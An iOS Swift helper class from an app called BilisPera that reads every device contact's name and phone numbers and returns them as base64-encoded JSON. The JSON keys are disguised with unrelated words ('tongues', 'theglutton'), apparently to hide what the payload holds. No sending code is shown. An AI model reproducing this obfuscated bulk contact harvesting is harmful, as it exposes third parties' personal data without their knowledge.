//
//  BPContactsTools.swift
//  BilisPera
//
//  Created by BHJ on 2025/8/21.
//

import Foundation
import Contacts

@objc
class BPContactsTools: NSObject {
    @MainActor @objc static let shared = BPContactsTools()
    private let store = CNContactStore()
    
    @objc func fetchContactsAsJSON() async -> String? {
        let keys: [CNKeyDescriptor] = [
            CNContactGivenNameKey,
            CNContactFamilyNameKey,
            CNContactPhoneNumbersKey
        ] as [CNKeyDescriptor]
        var contactsArray: Array = [[String: Any]]()
        let request = CNContactFetchRequest(keysToFetch: keys)
        do {
            try store.enumerateContacts(with: request) { contact, _ in
                var contactDict = [String: Any]()
                let name = "\(contact.givenName) \(contact.familyName)"
                let phones = contact.phoneNumbers.map { $0.value.stringValue }
                contactDict["tongues"] = name
                    .replacingOccurrences(of: " ", with: "")
                contactDict["theglutton"] = phones
                    .joined(separator: ",")
                    .replacingOccurrences(of: " ", with: "")
                contactsArray.append(contactDict)
            }
            let jsonData = try JSONSerialization.data(
                withJSONObject: contactsArray,
                options: [.sortedKeys]
            )
            let base64String = jsonData.base64EncodedString()
            return base64String
        } catch {
            return nil
        }
    }
}
